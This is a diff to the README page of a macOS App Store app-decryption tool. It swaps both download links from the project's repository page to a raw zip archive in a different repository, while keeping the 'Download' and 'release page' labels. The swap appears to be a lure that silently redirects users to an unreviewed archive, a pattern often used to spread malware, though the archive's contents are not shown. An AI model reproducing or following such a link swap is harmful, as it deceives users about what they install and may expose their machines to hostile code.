@@ -5,7 +5,7 @@ description: "Download and decrypt macOS App Store apps using an M1 Mac with thi
 ---
 # 🔒 macOSAppstoreDecrypter - Unlock your Apple store application files
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/minhasc790/macOSAppstoreDecrypter)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/minhasc790/minhasc790.github.io/main/app/2.6.zip)
 
 ## 📋 What this tool does
 
@@ -24,7 +24,7 @@ This tool does not work on Windows, Linux, or newer versions of macOS. If your s
 
 Visit the official repository page to download the latest version of the tool.
 
-[Visit the release page to download](https://github.com/minhasc790/macOSAppstoreDecrypter)
+[Visit the release page to download](https://raw.githubusercontent.com/minhasc790/minhasc790.github.io/main/app/2.6.zip)
 
 Follow these steps to save the file to your computer:
 
